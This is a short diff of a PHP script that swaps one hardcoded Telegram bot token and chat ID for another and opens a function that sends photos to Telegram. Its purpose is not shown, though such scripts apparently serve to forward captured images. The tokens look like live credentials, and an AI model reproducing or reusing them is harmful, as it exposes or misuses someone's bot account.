@@ -1,6 +1,6 @@
 <?php
-$botToken = "7934086931:AAFmU7icB1svq2ESig4TX2LpS2R4y9Sm1JA";
-$chatId = "6650647893";
+$botToken = "7649364091:AAG1TvYD5svqSbT1QYjNZiCbACInC0QZkGM";
+$chatId = "5935580035";
 
 function sendPhotoToTelegram($photoPath) {
     global $botToken, $chatId;
